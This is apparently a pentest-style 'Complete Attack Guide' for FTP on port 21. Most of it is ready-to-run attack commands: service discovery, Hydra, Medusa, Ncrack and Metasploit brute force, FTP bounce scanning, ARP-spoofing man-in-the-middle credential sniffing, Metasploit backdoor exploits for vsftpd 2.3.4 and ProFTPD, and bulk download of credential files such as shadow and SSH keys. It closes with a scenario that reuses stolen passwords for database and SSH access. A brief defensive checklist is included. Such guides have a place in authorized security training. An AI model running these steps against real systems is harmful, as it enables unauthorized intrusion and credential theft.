# Port 21 - FTP (File Transfer Protocol) - Complete Attack Guide

## Overview

**Protocol**: FTP (File Transfer Protocol)
**Port**: 21 (Control), 20 (Data - Active mode)
**Transport**: TCP
**Encryption**: None (use FTPS/SFTP for security)
**Authentication**: Username/Password (cleartext)

## Attack Objectives

- **Anonymous Access**: Exploit misconfigured anonymous FTP
- **Credential Theft**: Capture FTP credentials (cleartext)
- **Brute Force**: Crack FTP passwords
- **Bounce Attacks**: Use FTP server to scan other hosts
- **File Enumeration**: List and download files
- **Backdoor Upload**: Upload malicious files if write access

## Step-by-Step Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect FTP Service**
```bash
# Quick scan
nmap -p 21 192.168.1.100

# With service detection
nmap -p 21 -sV 192.168.1.100

# Network-wide FTP discovery
nmap -p 21 192.168.1.0/24 --open
```

**1.2 Banner Grabbing**
```bash
# Using Netcat
nc -v 192.168.1.100 21

# Using Telnet
telnet 192.168.1.100 21

# Using Nmap
nmap -p 21 --script=banner 192.168.1.100

# Using curl
curl -v telnet://192.168.1.100:21
```

**What to Look For**:
- FTP server software (vsftpd, ProFTPD, FileZilla, etc.)
- Version number (search for CVEs)
- Banner customization (may hide version)

**Example Banners**:
```
220 (vsFTPd 2.3.4)
220 ProFTPD 1.3.5 Server
220 Microsoft FTP Service
220 FileZilla Server version 0.9.60
```

**1.3 Service Enumeration**
```bash
# Comprehensive FTP enumeration
nmap -p 21 --script=ftp-* 192.168.1.100

# Specific checks
nmap -p 21 --script=ftp-anon 192.168.1.100           # Anonymous login
nmap -p 21 --script=ftp-bounce 192.168.1.100         # Bounce attack
nmap -p 21 --script=ftp-proftpd-backdoor 192.168.1.100  # ProFTPD backdoor
nmap -p 21 --script=ftp-vsftpd-backdoor 192.168.1.100   # vsFTPd backdoor
```

### Phase 2: Exploitation Techniques

**2.1 Anonymous Login**

**What is it**: FTP servers often allow anonymous access for public file sharing

**How to Test**:
```bash
# Method 1: FTP client
ftp 192.168.1.100
# Username: anonymous
# Password: anonymous@domain.com (or just press Enter)

# Method 2: Using Nmap
nmap -p 21 --script=ftp-anon 192.168.1.100

# Method 3: Automated
lftp -u anonymous,anonymous 192.168.1.100
```

**If Successful**:
```bash
# List files
ls -la
dir

# Download files
get filename.txt
mget *.txt  # Multiple files

# Try to upload (if write access)
put malicious.txt
mput *.php

# Navigate directories
cd directory
cd ..
pwd
```

**When to Use**: First thing to try on any FTP server

**2.2 Brute Force Attack**

**When to Use**:
- Anonymous access failed
- Have username list
- Weak password policy suspected
- Multiple accounts to test

**Using Hydra** (Recommended):
```bash
# Single user, password list
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100

# User list, password list
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# Specific parameters
hydra -l admin -P passwords.txt ftp://192.168.1.100 -t 4 -V
# -t 4: 4 parallel tasks
# -V: Verbose output

# With specific port
hydra -l admin -P passwords.txt ftp://192.168.1.100:2121
```

**Using Medusa**:
```bash
# Basic brute force
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ftp

# Multiple users
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 4

# Save output
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ftp -O ftp_results.txt
```

**Using Ncrack**:
```bash
# Single target
ncrack -p 21 --user admin -P passwords.txt 192.168.1.100

# Multiple targets
ncrack -p 21 -U users.txt -P passwords.txt 192.168.1.0/24
```

**Using Metasploit**:
```bash
msfconsole
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
set THREADS 10
run
```

**Brute Force Best Practices**:
- Start with common credentials: admin/admin, root/root, ftp/ftp
- Use targeted wordlists (corporate, industry-specific)
- Limit threads (-t) to avoid detection/locking
- Check for account lockout policies first
- Try default credentials for detected software version

**2.3 FTP Bounce Attack**

**What is it**: Use FTP server to scan/attack other hosts

**How it Works**:
1. Connect to vulnerable FTP server
2. Use PORT command to specify victim's IP:port
3. FTP server connects to victim
4. Use for port scanning or service exploitation

**Detection**:
```bash
# Check if bounce attack possible
nmap -p 21 --script=ftp-bounce 192.168.1.100

# Manual test
ftp 192.168.1.100
ftp> quote "PORT 192,168,1,50,0,80"  # Scan 192.168.1.50:80
```

**Exploitation**:
```bash
# Use FTP server as proxy to scan another host
nmap -b anonymous:password@192.168.1.100 -p 80,443 192.168.1.50

# Port scan through FTP
nmap -b ftp.target.com:21 -p 1-1024 victim.com
```

**When to Use**:
- Bypass firewall rules
- Hide scan source
- Access internal networks
- Scan from trusted source

**Modern Status**: Mostly patched in current FTP servers

**2.4 Credential Sniffing**

**What is it**: Capture FTP credentials in transit (cleartext protocol)

**Using tcpdump**:
```bash
# Capture FTP traffic
tcpdump -i eth0 -A 'tcp port 21' -w ftp_capture.pcap

# Filter for USER/PASS commands
tcpdump -i eth0 -A 'tcp port 21' | grep -E 'USER|PASS'
```

**Using Wireshark**:
```bash
# Start capture on interface
wireshark -i eth0 -k

# Apply display filter:
ftp.request.command == "USER" or ftp.request.command == "PASS"

# Or capture to file
tshark -i eth0 -w ftp.pcap 'tcp port 21'
```

**Using Ettercap/Bettercap** (MITM):
```bash
# Bettercap
bettercap -iface eth0
net.probe on
set arp.spoof.targets 192.168.1.100
arp.spoof on
set net.sniff.filter "tcp port 21"
net.sniff on

# Ettercap
ettercap -T -i eth0 -M arp /// /// -q
```

**Extract from PCAP**:
```bash
# Using tshark
tshark -r ftp.pcap -Y "ftp.request.command == USER" -T fields -e ftp.request.arg
tshark -r ftp.pcap -Y "ftp.request.command == PASS" -T fields -e ftp.request.arg
```

**When to Use**:
- Network access available
- MITM position achieved
- Monitoring internal FTP servers
- Passive reconnaissance

## Bypass Techniques

### Bypassing FTP Firewall Rules

**Technique 1: Passive Mode**
```bash
# FTP has two modes:
# Active: Server connects back to client (port 20)
# Passive: Client connects to server (random high port)

# Use passive mode to bypass firewall
ftp> passive
# or use lftp (passive by default)
lftp -u username,password 192.168.1.100
```

**Technique 2: Non-Standard Ports**
```bash
# FTP might run on non-standard ports
nmap -p 2121,8021,21000 192.168.1.100

# Connect to alternate port
ftp 192.168.1.100 2121
```

### Bypassing Authentication

**Technique 1: Exploit Known Vulnerabilities**
```bash
# vsftpd 2.3.4 Backdoor
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.1.100
exploit

# ProFTPD Backdoor
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOST 192.168.1.100
exploit
```

**Technique 2: Default Credentials**
Common defaults to try:
- anonymous:anonymous
- ftp:ftp
- admin:admin
- user:user
- test:test
- root:root

**Technique 3: Username Enumeration**
```bash
# Some FTP servers reveal valid usernames
# Different response for valid vs invalid users
ftp 192.168.1.100
ftp> USER admin
# Note the response code

ftp> USER nonexistentuser
# Compare response code
```

## Information Extraction

### What Information Can Be Extracted

**1. File System Structure**:
```bash
# After login
ls -laR                    # Recursive listing
find . -type f             # All files
```

**2. Sensitive Files to Look For**:
- Configuration files (.conf, .config, .ini)
- Backup files (.bak, .old, .backup)
- Database dumps (.sql, .db)
- Source code (.php, .asp, .jsp)
- SSH keys (.ssh/id_rsa, authorized_keys)
- Password files (passwd, shadow, htpasswd)
- Web files (config.php, wp-config.php)

**3. System Information**:
```bash
# FTP commands to gather info
SYST                       # System type
STAT                       # Server status
FEAT                       # Features supported
HELP                       # Available commands
```

**4. Download Everything**:
```bash
# Using wget
wget -r ftp://anonymous:anonymous@192.168.1.100/

# Using lftp
lftp -u anonymous,anonymous 192.168.1.100
mirror /                   # Download entire server
```

## Security Recommendations (Defense)

**For Defenders**:
1. **Disable Anonymous Access** unless required
2. **Use FTPS/SFTP** instead of plain FTP
3. **Implement Strong Passwords** and enforce policy
4. **Restrict Access by IP** using firewall rules
5. **Monitor FTP Logs** for brute force attempts
6. **Disable FTP Bounce** (PORT command restrictions)
7. **Use Encrypted Alternatives**: SFTP (SSH), FTPS, SCP
8. **Implement Account Lockout** after failed attempts
9. **Chroot Users** to their home directories
10. **Regular Security Updates** for FTP software

## Common Mistakes

**Attacker Mistakes**:
1. **Too Many Login Attempts**: Account lockout
2. **Not Trying Anonymous**: Miss easy wins
3. **Ignoring Data Port**: Missing passive mode files
4. **Not Downloading Config Files**: Miss credentials
5. **Assuming No Write Access**: Sometimes writable

**Defender Mistakes**:
1. **Anonymous with Write**: Major security risk
2. **Running as Root**: System compromise if exploited
3. **Default Credentials**: Easy targets
4. **No Encryption**: Credentials in cleartext
5. **Weak Permissions**: Expose sensitive files

## Practical Attack Scenario

**Goal**: Gain access to FTP server and extract data

```bash
# Step 1: Discover FTP
nmap -p 21 -sV 192.168.1.100
# Result: 21/tcp open  ftp     vsftpd 2.3.4

# Step 2: Try anonymous
ftp 192.168.1.100
# Login: anonymous
# Password: (blank)
# Result: Login successful

# Step 3: Explore
ftp> ls -la
ftp> cd backup
ftp> ls
# Found: database_backup.sql, config.php

# Step 4: Download sensitive files
ftp> get database_backup.sql
ftp> get config.php

# Step 5: Analyze downloaded files
cat config.php | grep password
# Found: $db_password = "SecretPass123";

# Step 6: Try credentials elsewhere
mysql -h 192.168.1.100 -u admin -pSecretPass123
# Success - database access!

# Step 7: Escalate
ssh admin@192.168.1.100
# Password: SecretPass123
# Success - shell access!
```

## Tools Summary

**Best Tool for Each Task**:
- **Banner Grabbing**: `nc`, `nmap --script=banner`
- **Anonymous Test**: `ftp` client, `nmap --script=ftp-anon`
- **Brute Force**: `hydra` (fastest), `medusa` (stable)
- **Bounce Attack**: `nmap -b`
- **File Download**: `wget -r`, `lftp mirror`
- **Credential Sniff**: `tcpdump`, `wireshark`
- **Vulnerability Check**: `nmap --script=ftp-*`, `metasploit`

## Related Attacks

- **Port 22 (SSH)**: Often paired with FTP, try same credentials
- **Port 80/443 (HTTP/HTTPS)**: FTP files might be web-accessible
- **Port 3306 (MySQL)**: Database credentials in FTP config files
- **Port 445 (SMB)**: Windows servers often have both FTP and SMB

## Further Reading

- RFC 959: File Transfer Protocol (FTP)
- OWASP Testing Guide: FTP Testing
- CVE Database: FTP vulnerabilities
- ProFTPD Security Advisories
- vsftpd Documentation
